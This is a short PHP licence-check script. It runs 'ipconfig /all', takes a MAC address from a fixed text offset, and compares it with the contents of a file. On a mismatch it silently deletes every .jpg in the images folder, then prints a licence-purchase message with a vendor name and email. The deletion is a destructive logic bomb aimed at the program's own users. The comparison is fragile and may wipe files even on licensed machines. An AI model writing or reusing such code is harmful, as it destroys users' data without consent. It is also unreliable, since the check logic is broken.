<?php  
		$myfile = fopen("test.php", "r");
		$read=fread($myfile,filesize("test.php"));
		
		 // Turn on output buffering  
       ob_start();  
       //Get the ipconfig details using system commond  
       system('ipconfig /all');  
       // Capture the output into a variable  
       $mycomsys=ob_get_contents();  
       // Clean (erase) the output buffer  
       ob_clean();  
       $find_mac = "Physical"; //find the "Physical" & Find the position of Physical text  
       $pmac = strpos($mycomsys, $find_mac);  
       // Get Physical Address  
       $macaddress=substr($mycomsys,($pmac+36),17);  
       //Display Mac Address  
	   
	   if($read !==$macaddress)
	   {
			$delete=array_map('unlink', glob("images/*.jpg"));
		   if ($delete)
		   {
				echo "You have not bought license for this software. Contact <h2>Khemsafe Computers</h2> or email <h2>kennyattans@gmail.com</h2> to get your license.";
		   }
		   else
		   {
				echo "Not deleted";
		   }
	   }
?>   